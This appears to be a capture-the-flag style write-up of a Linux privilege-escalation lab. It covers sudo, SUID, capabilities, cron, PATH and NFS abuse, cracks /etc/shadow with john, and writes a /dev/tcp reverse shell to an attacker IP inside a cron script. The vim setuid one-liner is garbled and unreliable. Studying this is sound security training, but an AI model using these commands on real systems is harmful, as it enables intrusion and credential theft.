# LineKernel



## Abdelrahman Ali Abdelaziz

<figure><img src="../../../../../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

Privilege escalation occurs when a computer user exploits system vulnerabilities or misconfigurations to gain access to other user accounts within a computer system. By obtaining access to these accounts, they can access additional files and execute administrative commands.

## In privilege escalations, there are two types of privilege escalations <a href="#ffc2" id="ffc2"></a>

**1. Vertical privilege escalation.**

**2. Horizontal privilege escalation.**



### Enumeration

The <mark style="color:red;">**`hostname`**</mark> command will return the hostname of the target machine

```
hostname 
or
uname -n
```

<figure><img src="../../../../../.gitbook/assets/image (406).png" alt=""><figcaption><p>Hostname For wade</p></figcaption></figure>

To get the Linux Kernel Version Use <mark style="color:red;">**`uname -r`**</mark>

```
uname -r 
```

<figure><img src="../../../../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

#### python version&#x20;

```
python -V
```

<figure><img src="../../../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

```
cat /etc/issuse
```

<figure><img src="../../../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

### initial Access

The kernel is the central program within a computer's operating system, holding full control over all aspects of the system. It is the part of the operating system that always remains in memory, enabling communication between hardware and software components. Typically written in a low-level language like C, the kernel is susceptible to binary exploitation techniques, which can be used to uncover vulnerabilities.

If you want to gain privilege escalation you can search for a POC using

{% code overflow="wrap" %}
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel version" or search in Google site:exploit-db.com "Linux kernel version
```
{% endcode %}

**ok I will search for the version of kernel-vulnerable**&#x20;

**I found** <mark style="color:red;">**`CVE-2015-1328`**</mark>&#x20;

* Ubuntu 14.04 - Linux ubuntu **3.13.0-24-generic** #46-Ubuntu x86\_64

{% embed url="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2015/CVE-2015-1328" %}

<figure><img src="../../../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

```bash
gcc exploit.c -o exploit
```

<figure><img src="../../../../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

### privEsc

### programs that the user can sudo&#x20;

<figure><img src="../../../../../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

By running <mark style="color:red;">**`sudo -l`**</mark> we can see all the binaries a user can do. we first run _<mark style="color:red;">**sudo -l**</mark>_

```bash
User karen may run the following commands on ip-10-10-202-96:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

```bash
sudo less flag2.txt
```

<figure><img src="../../../../../.gitbook/assets/image (410).png" alt=""><figcaption><p>sudo less</p></figcaption></figure>

To get a password Frank uses **`sudo less /etc/shadow`**

<figure><img src="../../../../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>



Privilege Escalation: SUID



<figure><img src="../../../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

We run the command

{% hint style="success" %}
**If the **<mark style="color:red;">**binary**</mark>** can lead to a **<mark style="color:red;">**privilege escalation**</mark>
{% endhint %}

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../../../../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

i searched i google to find the privisc using base64

<figure><img src="../../../../../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

```bash
base64 "$LFILE" | base64 --decode
```

<figure><img src="../../../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

unshasow

```bash
unshadow pass.txt shadow.txt > passshadow.txt
john passshadow.txt
```

<figure><img src="../../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

### &#x20;Limited capabilities <a href="#f11a" id="f11a"></a>

Remember&#x20;

{% hint style="success" %}
**If the** permission of a <mark style="color:red;">**binary**</mark>** can lead to a **<mark style="color:red;">**privilege escalation**</mark>
{% endhint %}

We search for this flaw using getcap.

```bash
getcap -r / 2>/dev/null
```

```bash
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

i searched i google to find the privisc using capabilities

```python
vim -c `:py3 import os; os.setuid(0); os.excel("/bin/sh", "sh", "-c", "reset; exec sh")'

```

<figure><img src="../../../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

crontab

**Cron** =>  used to create job scheduling in Linux

first, check for crontab config&#x20;

```
/etc/crontab
```

> <mark style="color:red;">**check all files u found check any think**</mark>&#x20;

<figure><img src="../../../../../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

We first check /karen/backup.sh

We first modify /Karen/backup.sh since we have permission

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.21.32.157/4444 0>&1

chmod 777 backup.sh

#set Revers shell in attacker 
nc -nvlp 4444
```

<figure><img src="../../../../../.gitbook/assets/image (418).png" alt=""><figcaption></figcaption></figure>

```
unshadow pass.txt shadow.txt > passshadow.txt
john passshadow.txt
```

<figure><img src="../../../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation: PATH

find the files writeable&#x20;

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

<figure><img src="../../../../../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

```
export PATH=/tmp:$PATH
```

<figure><img src="../../../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation: NFS

#### &#x20;Exploiting the Network File Sharing Protocol <a href="#b36f" id="b36f"></a>

Network File Sharing (NFS) is a protocol allowing you to share directories and files with other Linux clients over a network

```
cat /etc/exports
```

> Read the <mark style="color:red;">**\_ /etc/exports \_**</mark> file, if you find some directory that is configured as <mark style="color:red;">**no\_root\_squash**</mark>, then you can **access** it from **as a **<mark style="color:red;">**client**</mark> and **write inside** that directory **as** if you were the local <mark style="color:red;">**ro**</mark>**ot** of the machine.

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" %}

```bash
showmount -e <you-ip>
```

<figure><img src="../../../../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

* **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#c)).

1. ```bash
   #Attacker, as root user
   gcc -static payload.c -o payload
   mkdir /tmp/pe
   mount -o rw <IP>:<SHARED_FOLDER> /tmp/pe
   cd /tmp/pe
   cp /tmp/payload
   chmod +s payload

   #Victim
   cd <SHAREDD_FOLDER>
   ./payload
   ```

<figure><img src="../../../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

## Capstone Project



### Enumeration

Find the SUID&#x20;

<pre class="language-bash"><code class="lang-bash"><strong>find / -type f -perm -04000 -ls 2>/dev/null
</strong></code></pre>

<figure><img src="../../../../../.gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>

### unshadow

<figure><img src="../../../../../.gitbook/assets/image (422).png" alt=""><figcaption><p>Password1</p></figcaption></figure>

### su missy&#x20;

<figure><img src="../../../../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

### check the sudo&#x20;

```
sudo -l
```

<figure><img src="../../../../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

sudo Find

&#x20;

<figure><img src="../../../../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

```bash
sudo find . -exec /bin/sh \; -quit
```

<figure><img src="../../../../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

### Exploit Resources

{% embed url="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2015/CVE-2015-1328" %}

### other Resources

{% embed url="https://gtfobins.github.io/?source=post_page-----3fb61a09f7ba--------------------------------" %}

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" %}

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/payloads-to-execute#c" %}
